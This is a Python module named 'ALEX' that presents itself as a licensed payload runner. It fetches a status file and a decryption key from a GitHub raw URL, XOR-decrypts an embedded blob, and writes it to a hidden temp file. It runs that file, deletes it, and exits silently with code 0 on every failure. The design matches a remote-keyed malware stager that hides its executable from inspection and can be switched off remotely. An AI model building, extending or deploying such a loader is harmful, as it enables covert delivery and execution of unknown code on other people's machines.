

import base64
import hashlib
import json
import os
import platform
import stat
import subprocess
import sys
import tempfile
import time
import urllib.request
import uuid

__version__ = "1.0.0"

# ============================================================
# CONFIG — EDIT THESE
# ============================================================
GITHUB_USER = "alex0004124"
GITHUB_REPO = "ALEX"
GITHUB_BRANCH = "main"
# ============================================================

RAW_BASE = (
    f"https://raw.githubusercontent.com/"
    f"{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}"
)
STATUS_URL = f"{RAW_BASE}/status.json"
KEY_URL_TEMPLATE = RAW_BASE + "/keys/{job_id}.bin"

TIMEOUT = 6           # seconds
USER_AGENT = "ALEX/1.0"

# ============================================================
# Helpers
# ============================================================
def _http_get(url: str) -> bytes:
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
        return r.read()


def _hwid() -> str:
    parts = [
        platform.node(),
        platform.machine(),
        platform.system(),
        str(uuid.getnode()),
    ]
    for p in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
        try:
            with open(p) as f:
                parts.append(f.read().strip())
                break
        except Exception:
            pass
    return hashlib.sha256("|".join(parts).encode()).hexdigest()[:32]


def _silent_exit() -> None:
    """Exit cleanly so the caller sees a normal-looking exit."""
    sys.exit(0)


def _fetch_status() -> dict:
    raw = _http_get(STATUS_URL)
    return json.loads(raw.decode())


def _fetch_key(job_id: str) -> bytes:
    raw = _http_get(KEY_URL_TEMPLATE.format(job_id=job_id))
    return base64.b85decode(raw.strip())


def _xor_decrypt(blob: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(blob))


# ============================================================
# Main entry point
# ============================================================
def Py(encoded_blob: str, job_id: str = None, _quiet: bool = True) -> int:
    """
    Decode and execute a licensed payload.

    encoded_blob : str — base85( job_id_bytes + b'\\x00' + ciphertext )
    job_id       : str — optional if embedded in the blob
    """

    # ---- 0. Extract job_id from the blob ----
    try:
        raw = base64.b85decode(encoded_blob)
    except Exception:
        return _fatal("Malformed payload", _quiet)

    if job_id is None:
        sep = raw.find(b"\x00")
        if sep < 1:
            return _fatal("Malformed payload (no job id)", _quiet)
        job_id = raw[:sep].decode()
        ciphertext = raw[sep + 1:]
    else:
        ciphertext = raw

    # ---- 1. Fetch global status ----
    try:
        status = _fetch_status()
    except Exception:
        return _fatal("Cannot reach status", _quiet)

    if status.get("global") != "ACTIVE":
        return _fatal("Service disabled", _quiet)

    # ---- 2. Check this job ----
    jobs = status.get("jobs", {})
    jrec = jobs.get(job_id)
    if not jrec:
        return _fatal("Unknown job", _quiet)

    st = jrec.get("status", "active")
    if st != "active":
        return _fatal(f"Job {st}", _quiet)

    exp = jrec.get("expires")
    if exp is not None and exp < time.time():
        return _fatal("License expired", _quiet)

    # ---- 3. Optional HWID lock ----
    allowed_hwids = jrec.get("hwids")
    if allowed_hwids:
        if _hwid() not in allowed_hwids:
            return _fatal("Unlicensed device", _quiet)

    # ---- 4. Fetch per-job key ----
    try:
        key = _fetch_key(job_id)
    except Exception:
        return _fatal("Cannot fetch key", _quiet)

    # ---- 5. Decrypt ----
    try:
        payload = _xor_decrypt(ciphertext, key)
    except Exception:
        return _fatal("Decode failed", _quiet)

    # ---- 6. Write to temp, chmod, exec ----
    tmp_path = None
    try:
        fd, tmp_path = tempfile.mkstemp(suffix=".bin", prefix=".alx_")
        os.write(fd, payload)
        os.close(fd)
        os.chmod(tmp_path, stat.S_IRWXU)

        env = os.environ.copy()
        env["ALEX_JOB"] = job_id

        rc = subprocess.call([tmp_path], env=env)
        return rc

    except Exception as e:
        return _fatal(f"Execution failed: {e}", _quiet)

    finally:
        try:
            if tmp_path and os.path.exists(tmp_path):
                os.unlink(tmp_path)
        except Exception:
            pass


def _fatal(msg: str, quiet: bool) -> int:
    if not quiet:
        sys.stderr.write(f"[ALEX] {msg}\n")
    sys.exit(0)


# Convenience aliases
run = Py
